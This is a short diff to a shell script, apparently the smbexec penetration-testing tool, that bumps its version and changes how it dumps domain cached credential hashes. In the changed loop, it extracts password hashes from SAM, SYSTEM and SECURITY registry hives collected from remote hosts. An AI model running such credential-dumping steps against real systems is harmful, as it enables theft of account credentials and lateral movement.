@@ -24,7 +24,7 @@
 #
 #############################################################################################
 
-version="1.2.9"
+version="1.2.9.1"
 codename="Happy Accidents"
 # Check to see if X is running
 if [ -z $(pidof X) ] && [ -z $(pidof Xorg) ]; then
@@ -568,8 +568,8 @@ for i in $(cat ${RHOSTS}); do
 		if [ -e ${logfldr}/hashes/${i}/sam ] && [ -e ${logfldr}/hashes/${i}/sys ]; then
 			${creddumpath}/pwdump.py ${logfldr}/hashes/${i}/sys ${logfldr}/hashes/${i}/sam > ${logfldr}/hashes/${i}/localhashes.lst
 			if [ -e ${logfldr}/hashes/${i}/sec ]; then
-				${creddumpath}/cachedump.py ${logfldr}/hashes/${i}/sys ${logfldr}/hashes/${i}/sec > /tmp/smbexec/dcchashes.tmp
-				cat /tmp/smbexec/dcchashes.tmp |grep -v "ERR:" > /tmp/smbexec/dcchashes.lst
+				${smbexecpath}/cachedump.rb ${logfldr}/hashes/${i}/sec ${logfldr}/hashes/${i}/sys > /tmp/smbexec/dcchashes.tmp
+				cat /tmp/smbexec/dcchashes.tmp |grep ":"|cut -d ":" -f1-2 > /tmp/smbexec/dcchashes.lst
 				if [ -s /tmp/smbexec/dcchashes.lst ];then mv /tmp/smbexec/dcchashes.lst ${logfldr}/hashes/${i}/dcchashes.lst;fi
 			fi
 			echo -en "\e[1;32m [+]\e[0m Hashes from ${i} have been dumped...\n"
